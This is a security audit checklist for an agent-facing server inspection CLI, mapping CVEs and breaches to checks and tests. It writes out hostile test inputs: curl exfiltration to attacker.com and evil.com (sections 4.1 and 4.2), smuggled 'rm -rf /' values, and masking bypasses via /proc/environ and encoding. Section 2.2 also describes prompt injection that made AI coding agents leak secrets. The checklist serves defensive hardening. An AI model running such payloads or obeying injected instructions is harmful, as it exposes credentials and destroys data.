# Inspect v0.1.3 — Security Audit Checklist

**Source:** Real CVEs, production breaches, and security advisories mapped against inspect's feature surface. Every item references a documented incident.

---

## 1. SSH Layer — CVEs Directly Affecting Inspect's Architecture

### 1.1 CVE-2026-35388: OpenSSH ControlMaster Multiplexing Bypass (CRITICAL)
**What happened:** OpenSSH versions before 10.3 have a flaw where proxy-mode multiplexing sessions proceed without proper confirmation when `ControlMaster ask` is configured. An attacker sharing the control socket could establish unauthorized channels.
**Impact on inspect:** Inspect uses ControlMaster for persistent sessions. If the user's OpenSSH is < 10.3, the multiplexed session could be hijacked.
- [ ] Check: does inspect verify or warn about the OpenSSH version at `inspect connect` time?
- [ ] Check: does inspect set `ControlMaster=auto` (vulnerable) or `ControlMaster=yes` (explicit)?
- [ ] Recommend: add a version check on first connect. If OpenSSH < 10.3, warn about CVE-2026-35388. Document in `inspect help ssh`.

### 1.2 CVE-2026-35386: OpenSSH Shell Metachar Injection via Usernames
**What happened:** OpenSSH before 10.3 doesn't properly validate shell metacharacters in usernames when expanded from `%u` tokens in `ssh_config` Match exec blocks. A crafted username could inject commands.
**Impact on inspect:** If namespace config allows user-supplied usernames that flow into SSH command construction, metacharacters in the username could inject commands.
- [ ] Check: does inspect validate the `user` field in `servers.toml` against shell metacharacters?
- [ ] Check: is the username ever interpolated into a shell command string (vs passed as a separate argument)?
- [ ] Fix: validate usernames against `[a-zA-Z0-9_.-]` at config parse time. Reject anything else with a clear error.

### 1.3 CVE-2024-6387 (regreSSHion): OpenSSH RCE via Signal Handler Race
**What happened:** Unauthenticated RCE as root on glibc-based Linux systems via a signal handler race condition in sshd. 14M+ exposed servers identified.
**Impact on inspect:** Inspect doesn't run sshd, but it connects TO servers running sshd. If a target server is unpatched, inspect's connection could be intercepted.
- [ ] Not an inspect code issue, but document in `inspect help ssh`: "Ensure your target servers run OpenSSH >= 9.8 to avoid CVE-2024-6387."

### 1.4 CVE-2023-38408: SSH Agent Forwarding RCE
**What happened:** Remote code execution through OpenSSH's forwarded ssh-agent. If agent forwarding is enabled and the agent connects to an attacker-controlled server, arbitrary commands execute.
**Impact on inspect:** Inspect uses ssh-agent for key management. If `ForwardAgent` is enabled in the user's ssh_config, connecting to an untrusted server exposes the agent.
- [ ] Check: does inspect explicitly set `-o ForwardAgent=no` on all SSH connections? It should — inspect never needs agent forwarding.
- [ ] Fix: add `-o ForwardAgent=no` to all SSH command construction. Document why in RUNBOOK.

---

## 2. Secret Leakage — The Agent Context Window Problem

### 2.1 Claude Code .env Auto-Loading (Knostic Research, Dec 2025)
**What happened:** Claude Code automatically loads `.env` files from the working directory into memory. Any secrets in `.env` (API keys, DB passwords, proxy credentials) enter the LLM's context window without user consent. A proxy credential was discovered this way.
**Impact on inspect:** When an LLM agent uses `inspect run arte -- "env"`, the output contains all environment variables. Even with secret masking, the agent's context window has already seen the masked output — and masking is pattern-based, not complete.
- [ ] Check: is secret masking applied BEFORE the output reaches stdout (where the agent reads it)?
- [ ] Check: does `--redact-all` exist for paranoid mode that masks ALL env var values?
- [ ] Check: can an agent bypass masking by running `inspect run arte -- "cat /proc/1/environ"`? This dumps env vars in a non-KEY=VALUE format that the env masker won't recognize.
- [ ] Fix: mask `/proc/*/environ` output as a special case. Or block access to `/proc/*/environ` entirely in `run` mode with a warning.

### 2.2 "Comment and Control": Prompt Injection Leaking Secrets from AI Coding Agents (VentureBeat, April 2026)
**What happened:** Researchers injected prompts via GitHub PR comments that caused Claude Code, Gemini CLI, and Copilot to exfiltrate secrets from GitHub Actions runners. CVSS 9.4 per Anthropic. All three agents leaked secrets simultaneously through the same attack vector.
**Impact on inspect:** If an agent runs `inspect` commands based on instructions found in untrusted content (PR descriptions, issue comments, file contents), a crafted instruction could make the agent run `inspect run arte -- "env" --show-secrets` and pipe the output to an attacker-controlled endpoint.
- [ ] Check: `--show-secrets` requires explicit intent. Is there any way to enable it via environment variable (which could be injected)?
- [ ] Check: is there a `INSPECT_SHOW_SECRETS=true` env var or similar that bypasses the flag? There should NOT be.
- [ ] Document: in `inspect help safety`, warn that `--show-secrets` should never be used in automated/agent workflows unless the output is guaranteed to stay local.

### 2.3 Vercel April 2026 Breach: AI Platform → Employee Workspace → Customer Env Vars
**What happened:** Context.ai (an AI platform) was breached. Attacker used that foothold to compromise a Vercel employee's Google Workspace, then escalated into Vercel's internal systems. Customer environment variables were exposed. The attack chain: AI tool → employee account → production infrastructure → customer secrets.
**Impact on inspect:** Inspect is an AI tool that accesses production infrastructure and reads environment variables. If inspect's audit log, transcript, or output is stored in a shared location (cloud drive, Slack, CI artifacts), the same attack chain applies.
- [ ] Check: audit logs at `~/.inspect/audit/` are mode 600.
- [ ] Check: transcripts at `~/.inspect/history/` are mode 600.
- [ ] Check: no inspect output is ever written to a world-readable location.
- [ ] Check: `inspect put` never creates files with world-readable permissions on the remote.

---

## 3. Docker Container Security

### 3.1 CVE-2025-9074: Docker Desktop API Reachable from Containers (CVSS 9.3)
**What happened:** Any container on Docker Desktop could connect to the Docker Engine API at `192.168.65.7:2375` without authentication. A container could create new privileged containers, mount the host filesystem, and achieve full host compromise.
**Impact on inspect:** Inspect runs commands inside containers via `docker exec`. If a compromised container can reach the Docker API, it can escape. Inspect itself doesn't create this exposure, but `inspect run` commands execute inside containers that might be compromised.
- [ ] Not an inspect code issue, but relevant: `inspect why` should check if the Docker API is exposed without auth on the host. Flag it as a critical security finding.

### 3.2 CVE-2019-5736: runc Binary Overwrite Container Escape
**What happened:** A malicious container could overwrite the host's runc binary. When anyone uses `docker exec` to enter the container, the overwritten runc executes as root on the host. This directly targets the `docker exec` path that inspect uses.
**Impact on inspect:** Every `inspect run` and `inspect exec` command uses `docker exec` under the hood. If a container is compromised and has overwritten runc, the inspect user triggers the payload.
- [ ] Not an inspect code issue (requires patched Docker/runc >= 1.0-rc6). But document in `inspect help safety`: "Inspect uses `docker exec` to run commands in containers. Ensure your Docker installation is up to date to avoid container escape vulnerabilities."

### 3.3 CVE-2019-14271: Docker `cp` Container Escape
**What happened:** A vulnerability in Docker's `copy` command allowed full container escape when used with a malicious container. The `docker cp` code path loaded a library from the container's filesystem, which the container could control.
**Impact on inspect:** `inspect get` uses `docker cp` for container-to-host file transfer. If the target container is compromised, `docker cp` from it could trigger this vulnerability.
- [ ] Check: does `inspect get` use `docker cp` or `cat | ssh` for container file reads? If `docker cp`, document the dependency on patched Docker.

---

## 4. Command Injection Surfaces

### 4.1 CVE-2025-71284: sed Command Injection (Synway SMG, CVSS 9.8)
**What happened:** User input was interpolated directly into a `sed` command without sanitization. An attacker submitted `'; curl attacker.com/exfil?$(cat /etc/shadow); echo '` as the "radius_address" and achieved RCE. Actively exploited in the wild.
**Impact on inspect:** `inspect edit` constructs `sed` commands on the remote. If the sed expression contains shell metacharacters, they execute in the remote shell. This was already identified in the pitfalls doc (§3.1) — verify the fix.
- [ ] Check: sed expressions passed to `inspect edit` are shell-escaped before interpolation into the SSH command.
- [ ] Test: `inspect edit arte/service:/etc/foo 's/x/$(whoami)/g'` in dry-run. Verify: the `$(whoami)` is treated as a literal string, not executed.
- [ ] Test: `inspect edit arte/service:/etc/foo "s/x/\`id\`/g"` in dry-run. Verify: backtick substitution does not execute.

### 4.2 Script Mode Shebang Injection (F14)
**What happened (theoretical, based on CVE-2026-35386 pattern):** If a script's shebang line contains shell metacharacters (`#!/bin/bash;curl evil.com`), and the tool extracts the interpreter name without validation, the metacharacters execute.
- [ ] Check: shebang interpreter extraction is validated against `[A-Za-z0-9_.-]` (per F14 spec).
- [ ] Test: create a script with shebang `#!/bin/bash;curl evil.com/exfil`. Run via `inspect run --file`. Verify: the tool rejects the hostile shebang or falls back to `bash`.

### 4.3 Alias Parameter Injection (L3)
**What happened (theoretical, based on sed injection pattern):** If a parameterized alias value flows into a shell command, `@svc-logs(svc=pulse;rm -rf /)` could inject commands.
- [ ] Check: alias parameter values are treated as data, never interpolated into shell command strings.
- [ ] Test: `inspect search '@svc-logs(svc=pulse;rm -rf /)'`. Verify: the `;rm -rf /` is treated as a literal label value in the LogQL selector, not as a shell command.
- [ ] Check: the parameter value validation rejects or escapes shell metacharacters.

### 4.4 Template Injection via Log Content (F7)
**What happened (theoretical, based on Go template injection patterns):** If log content contains template syntax (`{{.field}}`) and the output template engine processes it, attacker-controlled log lines could execute template logic.
- [ ] Check: the `--format` template engine does NOT process template syntax found in data values. Data values are rendered as literal strings.
- [ ] Test: inject a log line containing `{{printf "%s" "injected"}}` into a container. Run `inspect logs --format '{{.line}}'`. Verify: the injected template is rendered as the literal string `{{printf "%s" "injected"}}`, not executed.

---

## 5. Secret Masking Bypasses

### 5.1 Base64 Encoding Bypass (GitHub Actions, Jenkins)
**What happened:** GitHub Actions auto-masks secrets in logs. Running `echo "$SECRET" | base64` outputs an encoded string that is NOT masked. Jenkins has the same limitation. The base64 value is trivially decodable.
- [ ] Check: document this as a known limitation in `inspect help safety`.
- [ ] Check: `--redact-all` exists and masks ALL values regardless of key pattern.

### 5.2 Encoding-based Evasion Patterns
**What happened:** Multiple CI systems found that secrets can be leaked through: hex encoding, URL encoding, splitting across multiple echo statements, reversing the string, JSON-encoding, or piping through `xxd`.
- [ ] These are all known limitations of pattern-based masking. Document them honestly.
- [ ] The core principle: "If an agent can see it, it can leak it" (Codenotary). Masking reduces accidental exposure but does not prevent intentional exfiltration.

### 5.3 PEM Key Detection Edge Cases
**What happened:** Harness CI found that PEM keys with non-standard headers (e.g., `-----BEGIN OPENSSH PRIVATE KEY-----` vs `-----BEGIN RSA PRIVATE KEY-----`) are missed by maskers that only check for one format.
- [ ] Check: the PEM masker handles all common private key headers:
  - `BEGIN RSA PRIVATE KEY`
  - `BEGIN EC PRIVATE KEY`
  - `BEGIN PRIVATE KEY` (PKCS#8)
  - `BEGIN OPENSSH PRIVATE KEY`
  - `BEGIN DSA PRIVATE KEY`
  - `BEGIN ENCRYPTED PRIVATE KEY`
- [ ] Test: create a file with each key type. Run `inspect run arte -- "cat keyfile"`. Verify: all are masked.

### 5.4 Connection String Password in URL
**What happened:** Common in production: `DATABASE_URL=postgres://admin:p@ssw0rd!@host/db`. The `@` in the password makes naive URL parsing fail — the parser thinks the host is `ssw0rd!@host` instead of `host`.
- [ ] Test: `inspect run arte -- "echo 'DATABASE_URL=postgres://admin:p@ssw0rd!@localhost/db'"`. Verify: the password portion is masked correctly despite the `@` in the password.
- [ ] This is genuinely hard to parse. Document any limitations in URL credential masking.

---

## 6. Audit Log & Transcript Security

### 6.1 Secrets in Audit Log Args Field (G2 — already identified)
**What happened (your own finding):** `inspect exec arte -- "psql -U admin -p s3cret"` records the full command including the password in the audit log's `args` field. The audit log becomes a credential store.
- [ ] Verify G2 fix: the `args` field is routed through the same redactor pipeline as stdout.
- [ ] Test: run a command with a password in the args. Check the audit JSONL. Verify: password is masked.

### 6.2 Transcript Contains Full Command Output
**What happened (theoretical):** F18 session transcripts record everything that passes through `inspect run` and `inspect exec`. If a command outputs secrets that escape the masker (base64, non-standard format), the transcript is a permanent record of the leak.
- [ ] Check: transcript output goes through the same masking pipeline as stdout.
- [ ] Check: transcript files are mode 600.
- [ ] Check: `inspect history grep` searches transcripts — does it also mask results?

### 6.3 Audit Log as Attack Forensics Target
**What happened (Vercel breach pattern):** An attacker who gains access to the operator's machine gets `~/.inspect/audit/` and `~/.inspect/history/` — containing every command run against every server, every file transferred, every config edit. This is an intelligence goldmine.
- [ ] Document: "The audit log and transcript are sensitive artifacts. Protect `~/.inspect/` with the same care as `~/.ssh/`."
- [ ] Check: `~/.inspect/` directory is mode 700.
- [ ] Check: snapshot files at `~/.inspect/audit/snapshots/` are mode 600.

---

## 7. File Transfer Security (F15)

### 7.1 Atomic Write via `set -C` (G9 — already identified)
**What happened:** Shell `>` redirection follows symlinks. An attacker who can predict the temp file path and create a symlink can redirect the write to an arbitrary file.
- [ ] Verify G9 fix: `set -C` (noclobber) is prepended to the atomic write script.

### 7.2 File Permission Preservation on Upload
**What happened (general):** Files uploaded to a server inherit the umask of the SSH session, not the permissions of the source file. A config file that was mode 640 locally becomes mode 644 on the server if the umask is 022.
- [ ] Check: `inspect put` with `--mode` explicitly sets permissions after upload via `chmod`.
- [ ] Check: without `--mode`, does inspect preserve the source file's permissions? Or use a safe default (mode 600)?

### 7.3 Directory Traversal in File Paths
**What happened (CVE-2019-14271 pattern):** If a file path contains `../`, the operation may escape its intended directory.
- [ ] Check: `inspect put` and `inspect get` validate that the resolved remote path doesn't traverse outside the container's filesystem.
- [ ] Test: `inspect put local.txt arte/service:/../../../etc/shadow --apply`. Verify: rejected with a clear error.

---

## 8. Bundle Engine Security (B9, L6)

### 8.1 YAML Deserialization
**What happened (LangChain CVE-2025-68664 pattern):** YAML deserialization can execute arbitrary code if the parser supports tags like `!!python/object` or `!!ruby/hash`.
- [ ] Check: bundle YAML parsing uses `serde_yaml` which does NOT support arbitrary type instantiation (Rust's type system prevents this). Verify no custom deserializer that could re-introduce this risk.

### 8.2 Command Injection via Bundle YAML `exec` Fields
**What happened (general injection pattern):** If a bundle YAML `exec` field contains user-controlled input (e.g., `{{ matrix.volume }}`), and the matrix values are not sanitized, shell injection is possible via the matrix definition.
- [ ] Check: matrix values in bundle YAML are treated as data, not code.
- [ ] Test: create a bundle with `matrix: { volume: ["valid", "$(rm -rf /)"] }`. Verify: the `$(rm -rf /)` is shell-escaped before execution, or rejected at parse time.

### 8.3 Rollback as a Denial of Service
**What happened (theoretical):** An attacker who can trigger a bundle failure at the right step can force a rollback that undoes legitimate work. If the rollback itself is destructive (e.g., `docker compose down`), the attacker achieves denial of service through the safety mechanism.
- [ ] This is a known property of rollback mechanisms. Document: "Rollback commands execute with the same permissions as forward commands. A malicious bundle YAML can cause intentional damage through its rollback block."
- [ ] Check: bundles loaded from untrusted sources (not the local filesystem) are rejected or require explicit confirmation.

---

## 9. Local Executor Mode (F19) Security

### 9.1 Local Mode Bypasses SSH Credential Gate
**What happened (new feature):** `type = "local"` skips SSH entirely. Commands run directly as the current user. This means no SSH key, no passphrase, no ControlMaster — the safety gate that prevents accidental access is gone.
- [ ] Check: local mode still enforces `--apply` on write verbs. The safety contract must not weaken just because there's no SSH.
- [ ] Check: local mode audit log records commands identically to remote mode.
- [ ] Check: `inspect exec local/service -- "rm -rf /" --apply` still dry-runs by default.

---

## 10. Password Authentication Security (L4)

### 10.1 Password in Process List
**What happened (sshpass pattern):** Tools that pass passwords via command-line arguments expose them in `/proc/<pid>/cmdline` and `ps aux` output. Any user on the same machine can see them.
- [ ] Check: password is NEVER passed as a command-line argument to `ssh` or any subprocess.
- [ ] Check: password authentication uses `SSH_ASKPASS` or `sshpass` via stdin pipe, not command-line args.

### 10.2 Password Stored in Memory After Connection
**What happened (general):** After authentication, the password remains in memory until the process exits. If the process is long-lived (ControlMaster with 4-hour TTL), the password is in memory for hours.
- [ ] Check: after successful authentication, the password is zeroed from memory using `zeroize` crate.
- [ ] Check: the password is never stored in inspect's own data structures beyond the authentication call.

### 10.3 Password Auth Enables Brute Force via Inspect
**What happened (general SSH brute force):** If inspect supports password auth, an attacker could script `inspect connect` in a loop to brute-force credentials.
- [ ] Verify: 3-attempt maximum per `inspect connect` session.
- [ ] Verify: failed attempts are logged in the audit with the namespace (NOT the password).
- [ ] Consider: exponential backoff between attempts (1s, 2s, 4s).

---

## Priority Test Order (by blast radius)

1. **§4.1** — sed injection on `edit` verb (RCE on remote server)
2. **§1.2** — username metachar injection (command injection via config)
3. **§4.2** — shebang injection on script mode (RCE via crafted script)
4. **§4.3** — alias parameter injection (command injection via alias)
5. **§6.1** — secrets in audit log args (permanent credential exposure)
6. **§2.1** — /proc/environ bypass of secret masking (full secret dump)
7. **§1.1** — CVE-2026-35388 ControlMaster multiplexing bypass (session hijack)
8. **§8.2** — bundle matrix shell injection (RCE via YAML)
9. **§5.4** — URL password parsing with special characters (masking bypass)
10. **§10.1** — password in process list (credential exposure)

Then cover the rest systematically.

---

## Post-Audit Actions

For each finding, classify as:

| Class | Action |
|---|---|
| **CRITICAL** — RCE or credential exposure | Fix before tagging v0.1.3 |
| **HIGH** — Security bypass under specific conditions | Fix before tagging or document as known limitation with mitigation |
| **MEDIUM** — Defense-in-depth hardening | Fix in next release or document |
| **LOW** — Documentation/awareness | Add to help topics |
| **INFORMATIONAL** — Not an inspect issue, but affects users | Document in `inspect help ssh` or `inspect help safety` |
